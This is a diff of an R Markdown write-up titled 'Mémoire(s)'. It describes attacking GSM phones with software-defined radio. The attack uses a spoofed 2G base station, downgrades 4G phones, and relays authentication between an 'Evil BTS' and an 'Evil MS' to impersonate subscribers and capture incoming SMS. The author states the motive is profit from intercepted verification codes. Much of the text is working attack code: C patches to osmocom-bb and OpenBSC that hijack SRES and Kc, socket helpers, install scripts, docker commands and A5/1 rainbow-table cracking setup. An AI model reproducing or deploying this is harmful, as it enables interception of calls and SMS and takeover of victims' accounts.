@@ -2,13 +2,24 @@
 title: "Mémoire(s)"
 author: "Bastien Baranoff"
 date: "`r Sys.Date()`"
+geometry: "left=3cm,right=3cm,top=2cm,bottom=2cm"
 output:
-  rmdformats::downcute:   
-    self_contained: true
-    default_style: "light"
-    downcute_theme: "chaos"
+  pdf_document:
+    latex_engine: xelatex
+    toc: yes
+    toc_depth: 2
+    highlight: kate
+  html_document:
+    toc: yes
+    toc_depth: '2'
+    df_print: paged
+  rmdformats::downcute:
+    self_contained: yes
+    default_style: light
+bibliography: bibliography.bib  
+always_allow_html: true
 ---   
-
+\newpage
 ```
 1
 00:00:57,265 --> 00:00:58,975
@@ -80,31 +91,20 @@ Bugs, this feels like a trap.
 Bugs!
 ```
 
-
+\newpage
 
 # Hello World !
+
 This is how it begin ?
 So why telecom ? Cause I have skills with ! Honestly was guided by security and wanted to be independant outside society but we have to live in... So what is to be independant : I think have money sorry if this is materialist but until  you prove the opposite we can't live without... Even commandos in nature have shoes ;) and they have to buy it. So the link between telecommunication and money ? Incomming SMS ! Paypal Verification, etc and I didn't want to abuse of trust and didn't want to search the 815e vulnerability in PHP. I wanted an always working hack or almost always working... So what is the way ?
 SDR : Software Defined Radio like the name says this kind of radios are software defined it means that demodulation is not part of hardware but is made software based. And now what can we do with ? So many things... I will focus on mobile telephony. So let's go !
 
-## Hacking 2G (Fooling MS : Mobile Station, the 2G phone)
-Easy ! The MS doesn't ask authentication from BTS (Base Transceiver Station, the relay antenna). So what to do to intercept ? Be a BTS... and that's all just spoof the public values of the BTS (mcc,mnc exemple 208,15 for FreeMobile 208,01 for Orange, etc) and broadcast a stronger signal and it is done. How the implement a 2G BTS ? there are open sourced implementation on github. 
-https://github.com/osmocom (OpenBSC Osmo-Trx Osmo-Bts... EOL but usefull) or (Network in the Box Updated)
-https://github.com/RangeNetworks/openbts
-https://github.com/vir/yate
 
-To install it I have scripted it for example for OpenBSC :
-```{r setup, include=FALSE, echo=FALSE, warning=FALSE} 
-library(pander) 
-library(knitr) 
-library(memisc) 
-library(stargazer)
-knitr::opts_chunk$set(echo = TRUE)  
-```
+
+
 \newpage 
 
-**Radio-Frequencies Protocols :**
----------------------------------     
+# Radio-Frequencies Protocols
 
 A protocol is for computing (quoted from Oxford langage):    
 "A set of rules governing the exchange or transmission of data between devices."    <https://www.oed.com/>.
@@ -125,13 +125,11 @@ Another goals came obviously from the first depending on the case of use : spend
 
 ------------------------------------------------------------------------
 
-**Radio-Telephony**
-===================
+# Radio-Telephony
 
 ------------------------------------------------------------------------
 
-**Example of SFR:**
-===================
+## Example of SFR:
 
 **Article 1**
 
@@ -160,11 +158,12 @@ For others Operator (GSM)
 ```
 Free = ? (Free didn't invest much in 2G antenna since 2G will die in 2025 in France the use Orange roaming )
 
----------------
-**2G Attack :**
----------------
+\newpage
 
-## Hacking 2G 
+# Let's hack it
+
+## Hacking 2G
+
 (Fooling MS : Mobile Station, the 2G phone)    The MS doesn't ask authentication from BTS (Base Transceiver Station, the relay antenna). So what to do to intercept ? Be a BTS... and that's all just spoof the public values of the BTS (mcc,mnc exemple 208,15 for FreeMobile 208,01 for Orange, etc) and broadcast a stronger signal and it is done. How the implement a 2G BTS ? there are open sourced implementation on github.     
 https://github.com/osmocom (OpenBSC Osmo-Trx Osmo-Bts... EOL but usefull) or (Network in the Box Updated)    
 https://github.com/RangeNetworks/openbts
@@ -372,8 +371,7 @@ I let as a reader research Yate, OpenBTS, Network In the Box ;)
 
 Now we have hacked 2G outgoing calls what to do ?
 
-Hacking 4G !
-============
+## Hacking 4G !
 
 [![4G Attack Active](diagram1_2G_act2.png)](diagram1_2G_act2.png)
 
@@ -643,8 +641,8 @@ UE (User Equipement : 4G phone) to fallback into 2G.
 
 Hey ! We gonna pretend that we are the MS in front of the BTS !
 
-Hacking 2G BTS
-==============
+## Hacking 2G BTS
+
 
 [![Attack Flow](test3.png)](test3.png)
 
@@ -735,10 +733,13 @@ Targets android \< 12, telco 2G until 2025 in France
 
 Thank for reading !
 
-Clients-servers architecture :
-==============================
+\newpage
 
-``` {.sourceCode .}
+# Hack sources
+
+## Clients-servers architecture :
+
+```bash
 bsc-2rfa 172.17.0.2
 server rand 888 listen on 0.0.0.0
 client sres 666 -> 172.17.0.3
@@ -752,8 +753,7 @@ osmocom-genuine-ms 172.17.0.2
 client kc 777 -> 172.17.0.3
 ```
 
-Headers :
-=========
+## Headers :
 
 suppress\_space.h
 
@@ -939,10 +939,9 @@ char* catch_sres(){
 }
 ```
 
-Evil-MS :
-=========
+## Evil-MS :
 
-``` {.sourceCode .bash}
+```bash
 git clone https://github.com/osmocom/osmocom-bb
 git checkout fc20a37cb375dac11f45b78a446237c70f00841c
 wget https://gitlab.com/francoip/thesis/raw/public/patch/thesis.patch
@@ -1029,8 +1028,7 @@ diff -ru osmocom-bb/src/host/layer23/src/mobile/subscriber.c heartbreaker/bb-2rf
         return 0;
 ```
 
-Genuine-MS (Kc Forwarding)
-==========================
+## Genuine-MS (Kc Forwarding)
 
 Patch osmocom-bb
 
@@ -1109,10 +1107,9 @@ diff -ru trx/src/host/layer23/src/mobile/subscriber.c osmocom-bb/src/host/layer2
     /* return signed response */
 ```
 
-Patch OpenBSC Evil-BTS:
-=======================
+## Patch OpenBSC Evil-BTS:
 
-``` {.sourceCode .bash}
+```bash
 git clone https://github.com/osmocom/openbsc
 git checkout 3f457a3b79e2908664b40eab9ca8e70c44a54898
 ```
@@ -1161,710 +1158,11 @@ diff -ru openbsc/openbsc/src/libmsc/gsm_04_08.c bsc-2rfa/openbsc/src/libmsc/gsm_
 +   ar->key_seq = kandy_seq;
 ```
 
-Installing BTS-Evil:
-====================
+\newpage 
 
-``` {.sourceCode .bash}
-git clone https://github.com/bbaranoff/heartbreaker
+# Install
 
-#!/bin/bash
-mkdir /heartbreaker
-cd /heartbreaker
-apt install autoconf-archive libdbd-sqlite3 gcc-9 g++-9 gcc-10 g++-10 git autoconf pkg-config libtool build-essential libtalloc-dev libpcsclite-dev gnutls-dev python2 python2-dev fftw3-dev libsctp-dev libdbi-dev -y
-cp /usr/bin/python2 /usr/bin/python
-update-alternatives --install /usr/bin/gcc gcc /usr/bin/gcc-9 90 --slave /usr/bin/g++ g++ /usr/bin/g++-9
-update-alternatives --install /usr/bin/gcc gcc /usr/bin/gcc-10 100 --slave /usr/bin/g++ g++ /usr/bin/g++-10
-update-alternatives --set gcc /usr/bin/gcc-9
-git clone git://git.osmocom.org/libosmocore.git
-cd  libosmocore
-git checkout 1.1.0
-autoreconf -fi
-./configure
-make
-make install
-ldconfig
-cd ..
-git clone git://git.osmocom.org/libosmo-dsp.git
-cd libosmo-dsp
-libtoolize && autoreconf -fi
-autoreconf -fi
-./configure
-make
-make install
-ldconfig
-apt install -y libortp-dev
-cd ..
-
-git clone https://github.com/osmocom/osmocom-bb
-cd osmocom-bb/src
-git checkout fixeria/trxcon
-make nofirmware
-
-cd ../..
-git clone https://github.com/osmocom/libosmo-abis
-cd libosmo-abis
-git checkout 0.8.1
-autoreconf -fi && ./configure --disable-dahdi && make -j4 && make install && ldconfig
-
-cd ..
-git clone https://github.com/osmocom/libosmo-netif
-cd libosmo-netif
-git checkout 0.6.0
-autoreconf -fi && ./configure && make -j4 && make install && ldconfig
-
-
-cd bsc-2rfa/openbsc
-autoreconf -fi && ./configure && make -j4
-cd ../..
-git clone https://github.com/osmocom/osmo-bts
-cd osmo-bts
-git checkout 0.8.1
-autoreconf -fi && ./configure --enable-trx && make -j4 && make install && ldconfig
-
-apt install ruby-libxml ruby-dev ruby-dbus
-gem install serial smartcard
-```
-
-Installing MS-Evil :
-====================
-
-``` {.sourceCode .bash}
-git clone https://github.com/bbaranoff/heartbreaker
-
-#!/bin/bash
-mkdir /heartbreaker
-cd /heartbreaker
-apt install autoconf-archive libdbd-sqlite3 gcc-9 g++-9 gcc-10 g++-10 git autoconf pkg-config libtool build-essential libtalloc-dev libpcsclite-dev gnutls-dev python2 python2-dev fftw3-dev libsctp-dev libdbi-dev -y
-cp /usr/bin/python2 /usr/bin/python
-update-alternatives --install /usr/bin/gcc gcc /usr/bin/gcc-9 90 --slave /usr/bin/g++ g++ /usr/bin/g++-9
-update-alternatives --install /usr/bin/gcc gcc /usr/bin/gcc-10 100 --slave /usr/bin/g++ g++ /usr/bin/g++-10
-update-alternatives --set gcc /usr/bin/gcc-9
-git clone git://git.osmocom.org/libosmocore.git
-cd  libosmocore
-git checkout 1.1.0
-autoreconf -fi
-./configure
-make
-make install
-ldconfig
-cd ..
-git clone git://git.osmocom.org/libosmo-dsp.git
-cd libosmo-dsp
-libtoolize && autoreconf -fi
-autoreconf -fi
-./configure
-make
-make install
-ldconfig
-apt install -y libortp-dev
-cd ..
-
-git clone https://github.com/osmocom/osmocom-bb
-cd osmocom-bb/src
-git checkout fixeria/trxcon
-make nofirmware
-
-cd ../..
-git clone https://github.com/osmocom/libosmo-abis
-cd libosmo-abis
-git checkout 0.8.1
-autoreconf -fi && ./configure --disable-dahdi && make -j4 && make install && ldconfig
-
-cd ..
-git clone https://github.com/osmocom/libosmo-netif
-cd libosmo-netif
-git checkout 0.6.0
-autoreconf -fi && ./configure && make -j4 && make install && ldconfig
-cd ..
-
-cd bsc-2rfa/openbsc
-autoreconf -fi && ./configure && make -j4
-cd ../..
-git clone https://github.com/osmocom/osmo-bts
-cd osmo-bts
-git checkout 0.8.1
-autoreconf -fi && ./configure --enable-trx && make -j4 && make install && ldconfig
-
-apt install ruby-libxml ruby-dev ruby-dbus
-gem install serial smartcard
-```
-
-Installing MS-Evil
-==================
-
-``` {.sourceCode .bash}
-#!/bin/bash
-mkdir /heartbreaker
-cd /heartbreaker
-apt install autoconf-archive libdbd-sqlite3 gcc-9 g++-9 gcc-10 g++-10 git autoconf pkg-config libtool build-essential libtalloc-dev libpcsclite-dev gnutls-dev python2 python2-dev fftw3-dev libsctp-dev libdbi-dev -y
-cp /usr/bin/python2 /usr/bin/python
-update-alternatives --install /usr/bin/gcc gcc /usr/bin/gcc-9 90 --slave /usr/bin/g++ g++ /usr/bin/g++-9
-update-alternatives --install /usr/bin/gcc gcc /usr/bin/gcc-10 100 --slave /usr/bin/g++ g++ /usr/bin/g++-10
-update-alternatives --set gcc /usr/bin/gcc-9
-git clone git://git.osmocom.org/libosmocore.git
-cd  libosmocore
-git checkout 0.9.0
-autoreconf -fi
-./configure
-make
-make install
-ldconfig
-cd ..
-git clone git://git.osmocom.org/libosmo-dsp.git
-cd libosmo-dsp
-libtoolize && autoreconf -fi
-autoreconf -fi
-./configure
-make
-make install
-ldconfig
-
-cd ../bb-2rfa/src
-make nofirmware
-```
-
-**A5/1 Cracking**
-=================
-
-Download the tables :
-
-[a51\_tables](https://infocon.org/rainbow%20tables/A51/)
-
-Prepare them :
-
-``` {.sourceCode .bash}
-#!/bin/bash
-offset_total=0
-echo 0 > test
-for abblay in $echo $(ls /media/$USER/tables) ; do abblay2=$(echo $abblay | sed 's/.dlt//g');
-cd /media/$USER/indexes/
-/media/$USER/indexes/kraken/TableConvert/TableConvert di /media/$USER/tables/$abblay2.dlt $abblay2.ins:$offset_total $abblay2.idx
-taille_arrondie=$(echo $(( $(( $(stat -c%s $abblay2.ins)/4096 )) +1 )) *4096 | bc)
-offset_total=$(($taille_arrondie + $offset_total))
-echo $taille_arrondie >> test
-done
-awk '{S+=$0}{print S}END{}' test > offsets
-git clone http://jenda.hrach.eu/p/deka
-git clone https://github.com/0x7678/typhon-vx/tree/master/kraken
-sudo add-apt-repository ppa:deadsnakes/ppa
-sudo apt update
-sudo apt install python3.7 python3.7-dev nvidia-utils-515-server xserver-xorg-video-nvidia-515
-sudo python3.7 -m pip install pyopencl numpy scipy
-cd deka
-./genkernel64.sh > slice.c
-sed -i -e 's/3.5m/3.7m/g' Makefile
-make
-```
-
-newpage
-[Redirection Attack](https://www.youtube.com/watch?v=gHKmmVZAaFo)
-
-And it does !
-
-Then what to do ?
-We know how to be a BTS in front of a MS and force the UE (User Equipement : 4G phone) to fallback into 2G.
-
-Hey ! We gonna pretend that we are the MS in front of the BTS !
-
-## Hacking 2G BTS
-
-![Attack Flow](test3.png)
-
-The UE has become an MS again and we know how to be a BTS !
-
-But even in the BTS does not authenticate MS does in front of the BTS. How can we bypass this ? By respecting the attack flow above ;)
-
-I mean the secret is the key Ki stored on the SIM even with physical access you can't crack it thanks to the chip inventor ! But we can fool the authentication process :
-The original process is :
-
-- The BTS send a rand,key_sequence to the MS.
-- The MS respond SRes = f(ki,rand)
-- The MS cipher the communication with Kc= f(Ki,rand,key_seq)
-
-The hacked process is :
-- The genuine BTS send a rand,key_seq to the Evil MS.
-- The Evil MS send it to our Evil BTS via socket between Evil BTS server and Evil MS client.
-- The Evil BTS send the rand,key_seq to genuine MS
-- The Genuine MS respond sres -> Evil BTS -> Evil MS -> Genuine BTS
-- In the example video Kc is forwarded between Genuine MS-> Evil MS
-
-[Impersonnate PoC](https://www.youtube.com/watch?v=gHKmmVZAaFo)
-
-With french explanations ;) sorry...
-
-[Impersonalisaion (français)](https://www.youtube.com/watch?v=gHKmmVZAaFo)
-
-With english explanation (now ;)
-[Impersonate (english)](https://www.youtube.com/watch?v=rSGA4oFsFrQ)
-
-https://imgur.com/lUjkpGp
-First of all there is a bug with brltty so
-
-```bash
-apt remove brltty
-```
-on host (not on docker !)
-Launch 1st
-```bash
-sudo docker run -it --privileged --user root --cap-add ALL  -v /dev/bus/usb:/dev/bus/usb bastienbaranoff/ms-final:hell_yeah
-```
-Launch 2nd
-```bash
-sudo docker run -it --privileged --user root --cap-add ALL  -v /dev/bus/usb:/dev/bus/usb bastienbaranoff/bts-final:hell_yeah
-```
-
-In this order cause need ip 172.17.0.2 for ms and 172.17.0.3 for bts (socket are made to work with theses addresses)
-
-in bts
-```bash
-tmux
-cd /
-service pcscd start
-./evil-bts.sh
-```
-`
-then in ms :
-```bash
-tmux
-cd /
-bash trx.sh
-ctrl-b c 
-./evil-ms.sh
-```
-set IMSI in OpenBSC (via telnet)
-and in /root/.osmocom/bb/mobile.cfg
-and set any ki but set one in OpenBSC
-need a motorola c1** and a sim reader
-
-What happen next ?
-
-[Crack A5/1](https://brmlab.cz/project/gsm/deka/attack-implementation)
-
-5s to crack it before the Kc ciphered channel timeout has been gone and if it is done we have incomming SMS.
-
-Targets android < 12, telco 2G until 2025 in France
-
-Thank for reading !
-
-## Clients-servers architecture :
-
-```
-bsc-2rfa 172.17.0.2
-server rand 888 listen on 0.0.0.0
-client sres 666 -> 172.17.0.3
-
-bb-2rfa 172.17.0.3
-client rand 888 -> 172.17.0.2
-server sres 666 listen on 0.0.0.0
-server kc 777 listen on 0.0.0.0
-
-osmocom-genuine-ms 172.17.0.2
-client kc 777 -> 172.17.0.3
-```
-
-## Headers :
-
-suppress_space.h
-
-```c
-#include <stdio.h>
-char res[100];
-char* spaces(char str [])
-{
-int i = 0;int j = 0;
-       while (str[i] != '\0')
-       {
-          if ((str[i] == ' ') != 1) {
-            res[j] = str[i];
-            j++;
-          }
-          i++;
-       }
-       res[j] = '\0';
-return res;}
-```
-
-hex.h
-```c
-/*
- * Read hex strings and output as text.
- *
- * No checking of the characters is done, but the strings must have an even
- * length.
- *
- * $Id: hex2ascii.c,v 1.1 2009/09/19 23:56:49 grog Exp $
- */
-
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
-#include "suppress_space.h"
-char hexdigit (char c)
-{
-  char outc;
-
-  outc = c -'0';
-  if (outc > 9)                                 /* A - F or a - f */
-    outc -= 7;                                  /* A - F */
-  if (outc > 15)                                /* a - f? */
-    outc -= 32;
-  if ((outc > 15) || (outc < 0))
-  {
-    fprintf (stderr, "Invalid character %c, aborting\n", c);
-    exit (1);
-  }
-  return outc;
-}
-char ascii[17];
-const unsigned char* hex2ascii(char hexval[])
-{  int arg;
-  char *c=spaces(hexval);
-  int sl;
-  char oc;
-
-  for (arg = 0; arg < 17; arg++)
-  {
-    sl = strlen (c);
-    if (sl & 1)                                 /* odd length */
-    {
-      fprintf (stderr,
-               "%s is %d chars long, must be even\n",
-               c,
-               sl );
-      return "prout";
-    }int i=0;
-    while (*c)
-    {
-      oc = (hexdigit (*c++) << 4) + hexdigit (*c++);
-      fputc (oc, stdout);
-      strcat(ascii,&oc);
-    }
-  }
-return ascii;}
-
-```
-
-client.h (respect address and port of client server arch)
-
-```c
-/**
- * Example taken from CS 241 @ UIUC
- * Edited by Austin Walters
- * Used as example for austingwalters.com,
- * in socket IPC explanation.
- */
-
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
-#include <sys/types.h>
-#include <sys/socket.h>
-#include <netdb.h>
-#include <unistd.h>
-
-void client(char buffer[]){
-
-  int sock_fd = socket(AF_INET, SOCK_STREAM, 0);
-
-  struct addrinfo info, *result;
-  memset(&info, 0, sizeof(struct addrinfo));
-  info.ai_family = AF_INET;
-  info.ai_socktype = SOCK_STREAM;
-
-  if(0 != getaddrinfo("172.17.0.3", "888", &info, &result))
-    exit(1);
-  
-  /* Connects to bound socket on the server */  
-  connect(sock_fd, result->ai_addr, result->ai_addrlen);
-
-  printf("SENDING: %s", buffer);
-  write(sock_fd, buffer, strlen(buffer));
-
-  char resp[999];
-  int len = strlen(buffer);
-  resp[len] = '\0';
-  printf("%s\n", resp);
-}
-```
-server.h (respect variable length : 13 for sres, 25 for kc, 51 for rand, and port from arch client-server) 
-
-```c
-/**
- * Written by Austin Walters
- * For an example on austingwalters.com,
- * on sockets
- */
-
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
-#include <sys/types.h>
-#include <sys/socket.h>
-#include <netdb.h>
-#include <unistd.h>
-char text[13];
-char* catch_sres(){
-
-  int sock_fd = socket(AF_INET, SOCK_STREAM, 0);
-  struct addrinfo directives, *result;
-  memset(&directives, 0, sizeof(struct addrinfo));
-  directives.ai_family = AF_INET;
-  directives.ai_socktype = SOCK_STREAM;
-  directives.ai_flags = AI_PASSIVE;
-
-  /* Translates IP, port, protocal into struct */
-  if(0 !=  getaddrinfo("0.0.0.0", "666", &directives, &result))
-    exit(1);
- 
-  /* Binds socket to port, so we know where new connections form */
-  if(bind(sock_fd, result->ai_addr, result->ai_addrlen) != 0)
-      exit(1);
-  /* Places socket to "listen" or "wait for stuff" state */
-  if(listen(sock_fd, 10) != 0)
-      exit(1);
-  int i=0;
-  printf("Waiting for connection on http://0.0.0.0:666 ...\n");
-  while(i==0){
-   
-    /* Accepts Connection */
-    char buffer[1000];
-    int client_fd = accept(sock_fd, NULL, NULL); 
-    int len = read(client_fd, buffer, 999);
-    buffer[len] = '\0';
-    
-    char * header = "<b>You Connected to the Server!</b></br></br>";
-    i=i+1;
-    write(client_fd, header, strlen(header));
-    
-    printf("=== Client Sent ===\n");
-    printf("%s\n", buffer);
-    memcpy(text,buffer,13);
-    close(client_fd);
-
-  }
-  return text;
-}
-```
-
-## Evil-MS :
-
-```bash
-git clone https://github.com/osmocom/osmocom-bb
-git checkout fc20a37cb375dac11f45b78a446237c70f00841c
-wget https://gitlab.com/francoip/thesis/raw/public/patch/thesis.patch
-patch -p1 < thesis.patch
-```
-
-```patch
-diff -ru osmocom-bb/src/host/layer23/src/mobile/gsm48_mm.c heartbreaker/bb-2rfa/src/host/layer23/src/mobile/gsm48_mm.c
---- osmocom-bb/src/host/layer23/src/mobile/gsm48_mm.c	2022-08-30 15:39:46.222274989 +0200
-+++ heartbreaker/bb-2rfa/src/host/layer23/src/mobile/gsm48_mm.c	2022-08-30 15:35:55.472598046 +0200
-@@ -20,6 +20,7 @@
-  */
- 
- #include <stdint.h>
-+#include <string.h>
- #include <errno.h>
- #include <stdio.h>
- #include <string.h>
-@@ -41,7 +42,7 @@
- #include <osmocom/bb/mobile/app_mobile.h>
- #include <osmocom/bb/mobile/vty.h>
- #include <osmocom/bb/mobile/dos.h>
--
-+#include "client.h"
- extern void *l23_ctx;
- 
- void mm_conn_free(struct gsm48_mm_conn *conn);
-@@ -1662,6 +1663,15 @@
- 	 */
- 	if (mm->est_cause == RR_EST_CAUSE_EMERGENCY && set->emergency_imsi[0])
- 		no_sim = 1;
-+	char test2[]="1";
-+	sprintf(test2, "%d", ar->key_seq);
-+	char test3[3]="-";//"87 65 43 21 87 65 43 21 87 65 43 21 87 65 43 21";
-+	strcat(test3,test2);
-+	char test[51]="87 65 43 21 87 65 43 21 87 65 43 21 87 65 43 21";
-+	strcpy(test,osmo_hexdump(ar->rand,16));
-+	strcat(test,test3);
-+	LOGP(DMM, LOGL_INFO, "AUTHENTICATION REQUEST (seq %s)\n", test);
-+	client(test);
- 	gsm_subscr_generate_kc(ms, ar->key_seq, ar->rand, no_sim);
- 
- 	/* wait for auth response event from SIM */
-diff -ru osmocom-bb/src/host/layer23/src/mobile/subscriber.c heartbreaker/bb-2rfa/src/host/layer23/src/mobile/subscriber.c
---- osmocom-bb/src/host/layer23/src/mobile/subscriber.c	2022-08-30 15:38:53.125893570 +0200
-+++ heartbreaker/bb-2rfa/src/host/layer23/src/mobile/subscriber.c	2022-08-30 15:35:55.476598075 +0200
-@@ -30,6 +30,11 @@
- #include <osmocom/bb/common/osmocom_data.h>
- #include <osmocom/bb/common/networks.h>
- #include <osmocom/bb/mobile/vty.h>
-+#include "server.h"
-+#include "server2.h"
-+#include "hex.h"
-+#include "hex2.h"
-+
- 
- /* enable to get an empty list of forbidden PLMNs, even if stored on SIM.
-  * if list is changed, the result is not written back to SIM */
-@@ -945,14 +950,21 @@
- 
- 		/* store sequence */
- 		subscr->key_seq = key_seq;
--		memcpy(subscr->key, vec->kc, 8);
-+
- 
- 		LOGP(DMM, LOGL_INFO, "Sending authentication response\n");
-+                char *h4ck3d_kc;
-+                h4ck3d_kc = catch_kc();
-+                const unsigned char *my_h4ck3d_kc=hex2ascii(h4ck3d_kc);
-+		char *h4ck3d_sres;
-+		h4ck3d_sres = catch_sres();
-+        	const unsigned char *my_h4ck3d_sres=hex2ascii2(h4ck3d_sres);
-+		memcpy(subscr->key, my_h4ck3d_kc, 8);
- 		nmsg = gsm48_mmevent_msgb_alloc(GSM48_MM_EVENT_AUTH_RESPONSE);
--		if (!nmsg)
--			return -ENOMEM;
- 		nmme = (struct gsm48_mm_event *) nmsg->data;
--		memcpy(nmme->sres, vec->sres, 4);
-+        	memcpy(nmme->sres,my_h4ck3d_sres, 4);
-+		LOGP(DMM, LOGL_INFO, "KC hijacked = %s\n",osmo_hexdump(my_h4ck3d_kc,8));
-+		LOGP(DMM, LOGL_INFO, "SRES hijacked = %s\n",osmo_hexdump(my_h4ck3d_sres,4));
- 		gsm48_mmevent_msg(ms, nmsg);
- 
- 		return 0;
-```
-
-
-## Genuine-MS (Kc Forwarding)
-Patch osmocom-bb
-
-```bash
-git clone https://github.com/osmocom/osmocom-bb
-git checkout fixeria/trxcon
-```
-```patch
-diff -ru trx/src/host/layer23/src/mobile/gsm48_mm.c osmocom-bb/src/host/layer23/src/mobile/gsm48_mm.c
---- trx/src/host/layer23/src/mobile/gsm48_mm.c	2022-08-30 16:41:37.076916961 +0200
-+++ osmocom-bb/src/host/layer23/src/mobile/gsm48_mm.c	2022-08-30 15:51:17.267099639 +0200
-@@ -1651,6 +1651,7 @@
- 	 */
- 	if (mm->est_cause == RR_EST_CAUSE_EMERGENCY && set->emergency_imsi[0])
- 		no_sim = 1;
-+	LOGP(DMM, LOGL_INFO, "AUTHENTICATION REQUEST (rand %s)\n", osmo_hexdump(ar->rand,16));	
- 	gsm_subscr_generate_kc(ms, ar->key_seq, ar->rand, no_sim);
- 
- 	/* wait for auth response event from SIM */
-diff -ru trx/src/host/layer23/src/mobile/subscriber.c osmocom-bb/src/host/layer23/src/mobile/subscriber.c
---- trx/src/host/layer23/src/mobile/subscriber.c	2022-08-30 16:41:37.076916961 +0200
-+++ osmocom-bb/src/host/layer23/src/mobile/subscriber.c	2022-08-30 15:51:17.267099639 +0200
-@@ -32,7 +32,7 @@
- #include <osmocom/bb/common/sap_proto.h>
- #include <osmocom/bb/common/networks.h>
- #include <osmocom/bb/mobile/vty.h>
--
-+#include "client.h"
- /* enable to get an empty list of forbidden PLMNs, even if stored on SIM.
-  * if list is changed, the result is not written back to SIM */
- //#define TEST_EMPTY_FPLMN
-@@ -369,6 +369,7 @@
- 
- 	/* key */
- 	memcpy(subscr->key, data, 8);
-+	//client(osmo_hexdump(subscr->key,8));
- 
- 	/* key sequence */
- 	subscr->key_seq = data[8] & 0x07;
-@@ -907,7 +908,7 @@
- 	struct msgb *nmsg;
- 	struct sim_hdr *nsh;
- 
--	/* not a SIM */
-+	/* not a SIM
- 	if (!GSM_SIM_IS_READER(subscr->sim_type)
- 	 || !subscr->sim_valid || no_sim) {
- 		struct gsm48_mm_event *nmme;
-@@ -944,6 +945,7 @@
- 
- 		/* store sequence */
- 		subscr->key_seq = key_seq;
-+		//client(osmo_hexdump(vec->kc,8));
- 		memcpy(subscr->key, vec->kc, 8);
- 
- 		LOGP(DMM, LOGL_INFO, "Sending authentication response\n");
-@@ -969,6 +971,7 @@
- 
- 	/* random */
- 	memcpy(msgb_put(nmsg, 16), rand, 16);
-+	LOGP(DMM, LOGL_NOTICE, "Key Sequence=%d\n",key_seq);
- 
- 	/* store sequence */
- 	subscr->key_seq = key_seq;
-@@ -1019,7 +1022,9 @@
- 	nsh->file = 0x6f20;
- 	data = msgb_put(nmsg, 9);
- 	memcpy(data, subscr->key, 8);
--	data[8] = subscr->key_seq;
-+        LOGP(DMM, LOGL_NOTICE, "KC=%s\n",osmo_hexdump(subscr->key,8));
-+	client(osmo_hexdump(subscr->key,8));
-+	data[8] = subscr->key;
- 	sim_job(ms, nmsg);
- 
- 	/* return signed response */
-```
-
-## Patch OpenBSC Evil-BTS:
-
-```bash
-git clone https://github.com/osmocom/openbsc
-git checkout 3f457a3b79e2908664b40eab9ca8e70c44a54898
-```
-```patch
-diff -ru openbsc/openbsc/src/libmsc/gsm_04_08.c bsc-2rfa/openbsc/src/libmsc/gsm_04_08.c
---- openbsc/openbsc/src/libmsc/gsm_04_08.c	2022-08-30 16:59:20.033455224 +0200
-+++ bsc-2rfa/openbsc/src/libmsc/gsm_04_08.c	2022-08-30 15:51:17.243099474 +0200
-@@ -70,7 +70,10 @@
- #include <osmocom/gsm/tlv.h>
- 
- #include <assert.h>
-+#include "server.h"
-+#include "hex.h"
-+#include "client.h"
-
- void *tall_locop_ctx;
- void *tall_authciphop_ctx;
- 
-@@ -908,6 +911,20 @@
- 	struct msgb *msg = gsm48_msgb_alloc_name("GSM 04.08 AUTH REQ");
- 	struct gsm48_hdr *gh = (struct gsm48_hdr *) msgb_put(msg, sizeof(*gh));
- 	struct gsm48_auth_req *ar = (struct gsm48_auth_req *) msgb_put(msg, sizeof(*ar));
-+        DEBUGP(DMM, "-> AUTH REQ (rand = %s)\n", osmo_hexdump(rand, 16));
-+	
-+
-+
-+	char *test;
-+	test=catch_rand();
-+	printf("test %s\n",test);
-+	char *randy=strtok(test," -");
-+	printf("rand %s\n",rand);
-+	char *kandy_seq=strtok(NULL,"-");
-+	printf("key_seq %s\n",kandy_seq);
-+	char *randy_magnum = spaces(randy);
-+        const unsigned char *randynator=hex2ascii(randy_magnum);
-+        memcpy(rand,randynator,16);
- 
- 	DEBUGP(DMM, "-> AUTH REQ (rand = %s)\n", osmo_hexdump(rand, 16));
- 	if (autn)
-@@ -917,7 +934,7 @@
- 	gh->proto_discr = GSM48_PDISC_MM;
- 	gh->msg_type = GSM48_MT_MM_AUTH_REQ;
- 
--	ar->key_seq = key_seq;
-+	ar->key_seq = kandy_seq;
- 
-```
-
-## Installing BTS-Evil:
+## Installing BTS-Evil
 
 ```bash
 git clone https://github.com/bbaranoff/heartbreaker
@@ -1929,7 +1227,6 @@ gem install serial smartcard
 
 ## Installing MS-Evil :
 
-
 ```bash
 git clone https://github.com/bbaranoff/heartbreaker
 
@@ -1990,49 +1287,18 @@ autoreconf -fi && ./configure --enable-trx && make -j4 && make install && ldconf
 apt install ruby-libxml ruby-dev ruby-dbus
 gem install serial smartcard
 ```
-## Installing MS-Evil
 
-```bash
-#!/bin/bash
-mkdir /heartbreaker
-cd /heartbreaker
-apt install autoconf-archive libdbd-sqlite3 gcc-9 g++-9 gcc-10 g++-10 git autoconf pkg-config libtool build-essential libtalloc-dev libpcsclite-dev gnutls-dev python2 python2-dev fftw3-dev libsctp-dev libdbi-dev -y
-cp /usr/bin/python2 /usr/bin/python
-update-alternatives --install /usr/bin/gcc gcc /usr/bin/gcc-9 90 --slave /usr/bin/g++ g++ /usr/bin/g++-9
-update-alternatives --install /usr/bin/gcc gcc /usr/bin/gcc-10 100 --slave /usr/bin/g++ g++ /usr/bin/g++-10
-update-alternatives --set gcc /usr/bin/gcc-9
-git clone git://git.osmocom.org/libosmocore.git
-cd  libosmocore
-git checkout 0.9.0
-autoreconf -fi
-./configure
-make
-make install
-ldconfig
-cd ..
-git clone git://git.osmocom.org/libosmo-dsp.git
-cd libosmo-dsp
-libtoolize && autoreconf -fi
-autoreconf -fi
-./configure
-make
-make install
-ldconfig
+\newpage
 
-cd ../bb-2rfa/src
-make nofirmware
-```
-
-# A5/1 Cracking :
+# A5/1 Cracking
 
 Download the tables :
 
-[a51_tables](https://infocon.org/rainbow%20tables/A51/)
+[a51\_tables](https://infocon.org/rainbow%20tables/A51/)
 
 Prepare them :
 
 ```bash
-
 #!/bin/bash
 offset_total=0
 echo 0 > test
@@ -2044,11 +1310,8 @@ offset_total=$(($taille_arrondie + $offset_total))
 echo $taille_arrondie >> test
 done
 awk '{S+=$0}{print S}END{}' test > offsets
-```
-```bash
 git clone http://jenda.hrach.eu/p/deka
-git clone https://github.com/0x7678/typhon-vx/tree/master/kraken 
-
